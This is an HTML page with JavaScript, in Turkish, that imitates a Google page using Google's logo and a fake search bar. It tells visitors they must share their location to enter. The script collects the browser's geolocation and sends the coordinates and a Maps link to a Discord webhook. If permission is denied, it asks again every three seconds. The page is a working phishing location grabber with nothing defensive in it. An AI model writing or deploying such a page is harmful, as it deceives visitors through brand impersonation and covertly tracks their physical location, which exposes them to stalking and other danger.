<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Google Sites Benzeri</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fff; /* Beyaz Arka Plan */
            color: #202124;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* √úst Bilgi Stilleri */
        .top-bar {
            background-color: #fff;
            padding: 15px 20px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
            display: flex;
            align-items: center;
        }

        .google-logo {
            width: 75px;
            margin-right: 20px;
        }

        /* Uyarƒ± Stilleri */
        .alert-container {
            position: fixed;
            top: 10px;
            right: 10px;
            background-color: #ff9800; /* Turuncu */
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            display: none; /* Ba≈ülangƒ±√ßta gizli */
        }
        .alert-container.show {
            display: block;
        }

        /* ƒ∞√ßerik Stilleri */
        .content {
            padding: 20px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center; /* ƒ∞√ßeriƒüi dikey olarak ortala */
            text-align: center;
        }

        /* Sahte Arama √áubuƒüu Stilleri */
        .search-bar-container {
            display: flex;
            align-items: center;
            background-color: #fff;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            padding: 10px 20px;
            margin-bottom: 20px;
            width: 80%;
            max-width: 600px;
        }
        .search-icon, .mic-icon {
            margin-right: 10px;
            color: #9aa0a6;
        }
        .search-input {
            border: none;
            outline: none;
            font-size: 16px;
            width: 100%;
        }

        /* Konum ƒ∞steƒüi Stilleri */
        .location-request-container {
            text-align: center;
            padding: 30px;
            border: 1px solid #dfe1e5;
            border-radius: 8px;
            background-color: #f9f9f9;
            width: 80%;
            max-width: 600px;
        }
        .location-request-button {
            background-color: #4285f4;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 15px;
        }
        .location-request-message {
            margin-bottom: 20px;
            font-size: 16px;
            color: #333;
        }
    </style>
</head>
<body>
    <!-- √úst Bilgi -->
    <div class="top-bar">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
    </div>
    <!-- Uyarƒ± Mesajƒ± -->
    <div class="alert-container" id="alertContainer">
        Bu site +16 ya≈ü i√ßindir ve hile ile alakalƒ±dƒ±r. Konumunuz alƒ±nmadan giri≈ü yapƒ±lamaz.
    </div>
    <!-- Sahte ƒ∞√ßerik -->
    <div class="content">
        <!-- Sahte Arama √áubuƒüu -->
        <div class="search-bar-container">
            <span class="search-icon">&#128269;</span>
            <input type="text" class="search-input" placeholder="Google'da arayƒ±n veya bir URL yazƒ±n">
            <span class="mic-icon">&#127928;</span>
        </div>
        <!-- Konum ƒ∞steƒüi Alanƒ± -->
        <div class="location-request-container" id="locationRequestContainer">
            <p class="location-request-message">Konumunuzun doƒürulanmasƒ± gerekiyor. L√ºtfen konum izni verin.</p>
            <button class="location-request-button" onclick="requestLocationPermission()">Konum ƒ∞znini Ver</button>
        </div>
    </div>
    <script>
        // Uyarƒ± mesajƒ±nƒ± g√∂ster
        document.getElementById('alertContainer').classList.add('show');
        // WEBHOOK URL'Nƒ∞Zƒ∞ BURAYA YAZIN (Discord i√ßin)
        const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // √ñRNEK
        let permissionGranted = false; // ƒ∞zin durumu

        function requestLocationPermission() {
            if (permissionGranted) {
                // Eƒüer izin zaten verilmi≈üse, tekrar istemeye gerek yok
                alert("Konum izni zaten verildi.");
                return;
            }
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        permissionGranted = true; // ƒ∞zin verildi
                        // Konum bilgisi alƒ±ndƒ±ktan sonra yapƒ±lacak i≈ülemler
                        sendLocationLog(latitude, longitude, accuracy, mapsUrl)
                            .then(() => {
                                alert("Konum bilgisi ba≈üarƒ±yla g√∂nderildi!");
                                document.getElementById('locationRequestContainer').style.display = 'none'; // Konum alƒ±ndƒ±ktan sonra alanƒ± gizle
                            })
                            .catch((error) => {
                                console.error("Konum bilgisi g√∂nderilirken hata:", error);
                                alert("Konum bilgisi g√∂nderilirken bir hata olu≈ütu. L√ºtfen konsolu kontrol edin.");
                            });
                    },
                    (error) => {
                        let errorMessage = "Konum alƒ±namadƒ±.";
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Konum izni reddedildi.";
                                // ƒ∞zin reddedilirse tekrar isteme (ƒ±srar etme)
                                setTimeout(() => {
                                    requestLocationPermission(); // 3 saniye sonra tekrar iste
                                }, 3000);
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Konum bilgisi mevcut deƒüil.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Konum isteƒüi zaman a≈üƒ±mƒ±na uƒüradƒ±.";
                                break;
                        }
                        alert(errorMessage);
                    }
                );
            } else {
                alert("Tarayƒ±cƒ±nƒ±z konum √∂zelliƒüini desteklemiyor.");
            }
        }
        async function sendLocationLog(lat, lon, acc, mapUrl) {
            const payload = {
                content: "üìç **Konum Bilgisi!**",
                embeds: [{
                    title: "Konum Bilgisi",
                    color: 5814783,
                    fields: [
                        { name: "Enlem (Latitude)", value: `\`\`\`${lat}\`\`\``, inline: true },
                        { name: "Boylam (Longitude)", value: `\`\`\`${lon}\`\`\``, inline: true },
                        { name: "Doƒüruluk", value: `\`\`\`~${acc.toFixed(0)} metre\`\`\``, inline: true },
                        { name: "Harita Linki", value: `[Google Maps](${mapUrl})`, inline: false },
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (!response.ok) {
                    throw new Error(`Webhook g√∂nderilemedi: ${response.status} ${response.statusText}`);
                }
                console.log("Discord'a log ba≈üarƒ±yla g√∂nderildi.");
            } catch (discordError) {
                console.error("Discord'a log g√∂nderilirken hata:", discordError);
                throw discordError;
            }
        }
    </script>
</body>
</html>
